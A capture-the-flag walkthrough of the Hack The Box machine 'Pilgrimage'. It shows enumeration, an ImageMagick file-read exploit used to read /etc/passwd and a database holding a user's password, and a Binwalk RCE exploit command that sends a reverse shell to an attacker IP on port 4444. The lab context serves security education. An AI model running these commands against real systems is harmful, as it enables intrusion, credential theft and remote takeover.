# Pilgrimage
Linux . Easy

## Enumeration

### Initial Nmap Scan
Our first step in probing the web application was an initial Nmap scan using the following command:

```
nmap -sCV -p- {machine IP}
```

![image](https://github.com/vsang181/Hackthebox/assets/28651683/2cd104de-7e65-4a71-be92-adf4ce9070a3)

This comprehensive scan returned a domain name for our target IP, which was subsequently added to the /etc/hosts file to enhance readability in further exploration.

### Exploring the Web Application

![image](https://github.com/vsang181/Hackthebox/assets/28651683/d73cbfb6-51d4-4833-9479-c12ae02791cd)

Following the initial scan, we began investigating the web application's features. This exploration revealed:

- A registration page, which automatically logs in new users
- A manual login page
- A home page featuring an image shrinking tool which allows users to upload images, subsequently displaying the resized image.

Once logged in, we were directed to a 'Dashboard' page. This interface displayed the original image file name and a link to the shrunken image, which had been assigned a new name by the application.

### Detailed Nmap Scan

To gain further insight into the underlying infrastructure, a second, more comprehensive Nmap scan was conducted. This scan revealed a hidden .git directory, which offered a potential opportunity for further investigation.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/b011b319-f938-49ca-80cf-a12745a792ee)

### Extracting Hidden Git Directory

In order to extract the contents of the hidden .git directory, we employed the git-dumper tool. This allowed us to gain access to the web application's source code, providing valuable information about the application's structure and functionality.

The source code comprised several different files for login, logout, register, and dashboard functionality, as well as an ELF 64-bit LSB executable called 'magick'. This command-line program is used to resize the images uploaded by users.

[git-dumper](https://github.com/arthaud/git-dumper)

![image](https://github.com/vsang181/Hackthebox/assets/28651683/4a63b9d3-ba32-49bd-8a7a-d962fe9e8a5d)

### Source Code Analysis

Detailed scrutiny of the index.php file revealed a PHP script that facilitates image uploads, resizing, and storage. The script initializes a session, imports a package named "bulletproof" to handle image uploads, checks user authentication, processes image uploads, and renders HTML for the webpage.

We also discovered a SQLite database path mentioned within the dashboard.php file.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/088a4f37-3dfd-496f-99a6-4bfed8d7b1a5)

### Investigating ImageMagick

In order to learn more about the potential vulnerabilities of the 'magick' tool, we downloaded it to our local system and checked the version.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/6b293647-bf5d-4a7d-9fcf-b36fff6fb32e)

Following a quick Google search, we discovered an Arbitrary File Read vulnerability in this version of ImageMagick. The provided Proof-of-Concept (POC) indicated that this vulnerability could be exploited for further investigations.

[ImageMagick 7.1.0-49 - Arbitrary File Read](https://www.exploit-db.com/exploits/51261)

[ imagemagick-lfi-poc](https://github.com/Sybil-Scan/imagemagick-lfi-poc)

## Exploitation

Taking advantage of the vulnerability we discovered, we first generated a blank .png file designed to read the "/etc/passwd" file. This was achieved using the following command:

```
python3 generate.py -f "/etc/passwd" -o exploit.png
```

This malicious .png file was then uploaded to the web application and the shrunken image resulting from the server's processing was saved locally for further analysis.

To extract the hexadecimal content embedded in the manipulated image, we utilized the command-line tool 'identify' with the following command:

```
identify -verbose {filename.png}
```
This yielded the target hexadecimal code.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/c3f759a8-d888-440f-b2d0-c93afa4730de)

The hexadecimal code was then converted into a string format using the following Python command:

```
python3 -c 'print(bytes.fromhex("{Hex Code}").decode("utf-8"))'
```

The decoded string revealed the presence of a user named Emily in the system.

Leveraging the Local File Inclusion vulnerability we had previously established, we proceeded to download the database.

The target file was changed from "/etc/passwd" to "/var/db/pilgrimage" within the original exploit command.

This action resulted in a large data dump, which was subsequently analyzed using an online tool for convenience.

[CyberChef](https://gchq.github.io/CyberChef/)

The analysis of this data revealed Emily's password.

![Screenshot_2023-07-26_21-34-34](https://github.com/vsang181/Hackthebox/assets/28651683/55500606-123e-475b-b6af-70819061ca42)

We then attempted an SSH login using Emily's credentials. The login attempt proved successful.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/5bfd9db7-82e7-4268-bc88-2e88589d5805)

Finally, this successful login revealed the desired user flag, marking the completion of our exploration and exploitation journey.

![image](https://github.com/vsang181/Hackthebox/assets/28651683/2cea703a-9865-4802-a843-d70ba17d636d)

## Privilege Escalation

An initial attempt to run 'sudo -l' to list Emily's sudo privileges was unsuccessful.

By running the linpeas.sh script, we discovered a process located at /usr/sbin/malwarescan.sh. As user Emily, we have read permissions for this process.

The content of the script revealed the following details:

![image](https://github.com/vsang181/Hackthebox/assets/28651683/d0188909-07c1-4fc7-9dc9-6e6cd3c3d177)

The bash script was designed to monitor a specific directory (/var/www/pilgrimage.htb/shrunk/) for the creation of new files, employing the 'inotifywait' command for this purpose.

The script has a blacklist, an array of string patterns ("`Executable script`" and "`Microsoft executable`"). If the output of the `binwalk` command (stored in the `binout` variable) contains any of the blacklisted string patterns, the script removes the file.

A check on the 'binwalk' version revealed it to be Binwalk v2.3.2.

A quick Google search for known exploits against this version of binwalk unveiled a Remote Command Execution (RCE) vulnerability.

[Binwalk v2.3.2 - Remote Command Execution (RCE)](https://www.exploit-db.com/exploits/51249)

With this identified vulnerability, we had the potential to remotely execute code as root within the system.

The exploit code was saved into a file, named, for instance, 'exploit.py'.

The exploit was launched using the following command:

```
python3 exploit.py /path/to/input.png your.ip.address.here 4444
```

This operation created a png file ready to be uploaded and subsequently executed by 'binwalk', as identified earlier in the 'malwarescan.sh' script.

Concurrently, we started listening on the specified port via 'netcat'.

An HTTP server was then started, and while still in SSH, the 'wget' command was used to retrieve the file into the specified folder.

## Let's Connect

I welcome your insights, feedback, and opportunities for collaboration. Together, we can make the digital world safer, one challenge at a time.

- **LinkedIn**: (https://www.linkedin.com/in/aashwadhaama/)

I look forward to connecting with fellow cybersecurity enthusiasts and professionals to share knowledge and work together towards a more secure digital environment.

This process ultimately resulted in gaining a root shell, enabling access to the coveted root flag.
